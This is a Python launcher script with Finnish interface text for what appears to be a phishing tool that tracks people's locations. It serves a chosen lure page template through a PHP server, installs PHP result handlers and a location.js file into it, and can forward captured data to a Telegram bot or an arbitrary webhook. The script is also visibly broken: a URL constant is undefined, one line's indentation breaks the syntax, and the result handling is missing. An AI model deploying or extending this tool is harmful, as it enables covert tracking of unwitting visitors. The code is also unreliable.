#!/usr/bin/env python3

VERSION = '1.3.1'

R = '\033[31m'  
G = '\033[32m'  
C = '\033[36m'  
W = '\033[0m'   
Y = '\033[33m'  

import sys
import utils
import argparse
import requests
import traceback
import shutil
from time import sleep
from os import path, kill, mkdir, getenv, environ, remove, devnull
from json import loads, decoder
from packaging import version

parser = argparse.ArgumentParser()
parser.add_argument('-k', '--kml', help='KML-tiedoston nimi')
parser.add_argument('-p', '--port', type=int, default=8080, help='Verkkopalvelimen portti [ Oletus : 8080 ]')
parser.add_argument('-u', '--update', action='store_true', help='Tarkista päivitykset')
parser.add_argument('-v', '--version', action='store_true', help='Tulostaa version')
parser.add_argument('-t', '--template', type=int, help='Lataa malli ja parametrit ympäristömuuttujista')
parser.add_argument('-d', '--debugHTTP', type=bool, default=False, help='Poista HTTPS-uudelleenohjaus vain testauksen vuoksi')
parser.add_argument('-tg', '--telegram', help='Telegram-botin API-tunnus [ Muoto -> token:chatId ]')
parser.add_argument('-wh', '--webhook', help='Webhook-URL [ POST-menetelmä ja ilman todennusta ]')

args = parser.parse_args()
kml_fname = args.kml
port = getenv('PORT') or args.port
chk_upd = args.update
print_v = args.version
telegram = getenv('TELEGRAM') or args.telegram
webhook = getenv('WEBHOOK') or args.webhook

if (getenv('DEBUG_HTTP') and (getenv('DEBUG_HTTP') == '1' or getenv('DEBUG_HTTP').lower() == 'true')) or args.debugHTTP is True:
    environ['DEBUG_HTTP'] = '1'
else:
    environ['DEBUG_HTTP'] = '0'

templateNum = int(getenv('TEMPLATE')) if getenv('TEMPLATE') and getenv('TEMPLATE').isnumeric() else args.template

path_to_script = path.dirname(path.realpath(__file__))

SITE = ''
SERVER_PROC = ''
LOG_DIR = f'{path_to_script}/logs'
DB_DIR = f'{path_to_script}/db'
LOG_FILE = f'{LOG_DIR}/php.log'
DATA_FILE = f'{DB_DIR}/results.csv'
INFO = f'{LOG_DIR}/info.txt'
RESULT = f'{LOG_DIR}/result.txt'
TEMPLATES_JSON = f'{path_to_script}/template/templates.json'
TEMP_KML = f'{path_to_script}/template/sample.kml'
META_FILE = f'{path_to_script}/metadata.json'
PID_FILE = f'{path_to_script}/pid'

if not path.isdir(LOG_DIR):
    mkdir(LOG_DIR)

if not path.isdir(DB_DIR):
    mkdir(DB_DIR)


def chk_update():
    try:
        print('> Hakee metatietoja...', end='')
        rqst = requests.get(META_URL, timeout=5)
        meta_sc = rqst.status_code
        if meta_sc == 200:
            print('OK')
            metadata = rqst.text
            json_data = loads(metadata)
            gh_version = json_data['version']
            if version.parse(gh_version) > version.parse(VERSION):
                print(f'> Uusi päivitys saatavilla: {gh_version}')
            else:
                print('> Jo ajantasalla.')
    except Exception as exc:
        utils.print(f'Poikkeus: {str(exc)}')


if chk_upd is True:
    chk_update()
    sys.exit()

if print_v is True:
    utils.print(VERSION)
    sys.exit()

import socket
import importlib
from csv import writer
import subprocess as subp
from ipaddress import ip_address
from signal import SIGTERM

with open(devnull, 'w') as nf:
    sys.stderr = nf
    import psutil
sys.stderr = sys.__stderr__


def banner():
    with open(META_FILE, 'r') as metadata:
        json_data = loads(metadata.read())
        twitter_url = json_data['twitter']
        comms_url = json_data['comms']

def send_webhook(content, msg_type):
    if webhook is not None:
        if not webhook.lower().startswith('http://') and not webhook.lower().startswith('https://'):
            utils.print(f'{R}[-] {C}Protokolla puuttuu, lisää http:// tai https://{W}')
            return
        if webhook.lower().startswith('https://discord.com/api/webhooks'):
            from discord_webhook import discord_sender
            discord_sender(webhook, msg_type, content)
        else:
            requests.post(webhook, json=content)


def send_telegram(content, msg_type):
    if telegram is not None:
        tmpsplit = telegram.split(':')
        if len(tmpsplit) < 3:
            utils.print(f'{R}[-] {C}Telegram API-tunnus virheellinen! Muoto -> token:chatId{W}')
            return
        from telegram_api import tgram_sender
        tgram_sender(msg_type, content, tmpsplit)


def template_select(site):
    utils.print(f'{Y}[!] Valitse malli :{W}\n')

    with open(TEMPLATES_JSON, 'r') as templ:
        templ_info = templ.read()

    templ_json = loads(templ_info)

    for item in templ_json['templates']:
        name = item['name']
        utils.print(f'{G}[{templ_json["templates"].index(item)}] {C}{name}{W}')

    try:
        selected = -1
        if templateNum is not None:
            if templateNum >= 0 and templateNum < len(templ_json['templates']):
                selected = templateNum
        else:
            selected = int(input(f'{G}[>] {W}'))
        if selected < 0:
            print()
            utils.print(f'{R}[-] {C}Virheellinen syöte!{W}')
            sys.exit()
    except ValueError:
        print()
        utils.print(f'{R}[-] {C}Virheellinen syöte!{W}')
        sys.exit()

    try:
        site = templ_json['templates'][selected]['dir_name']
    except IndexError:
        print()
        utils.print(f'{R}[-] {C}Virheellinen syöte!{W}')
        sys.exit()

    print()
    utils.print(f'{G}[+] {C}Ladataan {Y}{templ_json["templates"][selected]["name"]} {C}malli...{W}')

    imp_file = templ_json['templates'][selected]['import_file']
    importlib.import_module(f'template.{imp_file}')
    shutil.copyfile('php/error.php', f'template/{templ_json["templates"][selected]["dir_name"]}/error_handler.php')
    shutil.copyfile('php/info.php', f'template/{templ_json["templates"][selected]["dir_name"]}/info_handler.php')
    shutil.copyfile('php/result.php', f'template/{templ_json["templates"][selected]["dir_name"]}/result_handler.php')
    jsdir = f'template/{templ_json["templates"][selected]["dir_name"]}/js'
    if not path.isdir(jsdir):
        mkdir(jsdir)
    shutil.copyfile('js/location.js', jsdir + '/location.js')
    return site


def server():
    print()
    port_free = False
    utils.print(f'{G}[+] {C}Portti: {W}{port}\n')
    utils.print(f'{G}[+] {C}Käynnistetään PHP-palvelin...{W}', end='')
    cmd = ['php', '-S', f'0.0.0.0:{port}', '-t', f'template/{SITE}/']

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        try:
            sock.connect(('127.0.0.1', port))
        except ConnectionRefusedError:
            port_free = True

    if not port_free and path.exists(PID_FILE):
        with open(PID_FILE, 'r') as pid_info:
            pid = int(pid_info.read().strip())
            try:
                old_proc = psutil.Process(pid)
                if old_proc.is_running():
                    utils.print(f'{R}[-] {C}PHP-palvelin on jo käynnissä: {pid}{W}')
                    sys.exit()
            except psutil.NoSuchProcess:
                utils.print(f'{R}[-] {C}Prosessia ei löydy, luodaan uusi palvelin...{W}')
        kill(pid, SIGTERM)
        sleep(1)

    proc = subp.Popen(cmd)
    with open(PID_FILE, 'w') as pid_info:
        pid_info.write(str(proc.pid))

    utils.print(f'{G}[+] {C}PHP-palvelin käynnistetty!{W}')
    return proc


def main():
    banner()
    global SITE

    if kml_fname is not None:
        SITE = template_select(SITE)
utils.print(f'{G}[>] {C}KML-tiedosto: {W}{kml_fname}')

    proc = server()

    while True:
        sleep(1)

    proc.wait()


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        utils.print(f'\n{R}[-] {C}Ohjelma keskeytetty!{W}')
    except Exception as exc:
        traceback.print_exc()
        utils.print(f'\n{R}[-] {C}Poikkeus: {str(exc)}{W}')
    finally:
        if path.exists(PID_FILE):
            remove(PID_FILE)
        utils.print(f'{G}[+] {C}Käynnistysloppu!{W}')
